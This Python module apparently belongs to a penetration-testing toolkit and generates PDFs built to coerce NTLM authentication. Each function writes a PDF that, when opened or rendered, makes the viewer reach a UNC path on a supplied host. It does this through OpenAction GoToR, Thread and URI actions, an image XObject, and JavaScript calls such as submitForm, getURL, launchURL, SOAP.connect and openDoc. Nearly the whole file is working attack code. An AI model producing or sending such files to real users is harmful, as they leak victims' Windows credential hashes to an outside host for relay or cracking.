"""UNC / NTLM coercion PDF generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme


def _unc_host(host):
    """Strip scheme for UNC path."""
    return host.replace('https://', '').replace('http://', '').split('/')[0]


def _unc_action_pdf(filename, host, action_s, action_extra, label):
    """Helper to generate a PDF with a single UNC action on OpenAction."""
    unc = _unc_host(host)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: \'''' + label + '''\') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S ''' + action_s + '''
     ''' + action_extra + '''
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


def write_unc_xobject(filename, host):
    unc = _unc_host(host)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 5 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'unc-xobj'    ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace /DeviceRGB
     /F (\\\\''' + unc + '''\\unc-xobject.jpg)
     /Length 0
  >>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000600 00000 n
0000000750 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1000
%%EOF
''')


def write_unc_gotor(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/GoToR',
        '/F << /Type /FileSpec /F (\\\\\\\\' + unc + '\\\\unc-gotor.pdf) /V true >>\n     /D [0 /Fit]',
        'unc-gotor')


def write_unc_thread(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/Thread',
        '/F << /Type /FileSpec /F (\\\\\\\\' + unc + '\\\\unc-thread.pdf) /V true >>\n     /D 0',
        'unc-thread')


def write_unc_uri(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/URI',
        '/URI (\\\\\\\\' + unc + '\\\\unc-uri)',
        'unc-uri')


def write_unc_js_submit_form(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (this.submitForm({cURL: "\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\unc-submitform.fdf"}))',
        'unc-submitform')


def write_unc_js_get_url(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (this.getURL("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\unc-geturl.pdf"))',
        'unc-geturl')


def write_unc_js_launch_url(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (app.launchURL("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\unc-launchurl.pdf"))',
        'unc-launchurl')


def write_unc_js_soap(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (SOAP.connect("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\unc-soap.pdf"))',
        'unc-soap')


def write_unc_js_open_doc(filename, host):
    unc = _unc_host(host)
    _unc_action_pdf(filename, host, '/JavaScript',
        '/JS (app.openDoc("\\\\\\\\\\\\\\\\' + unc + '\\\\\\\\unc-opendoc.pdf"))',
        'unc-opendoc')
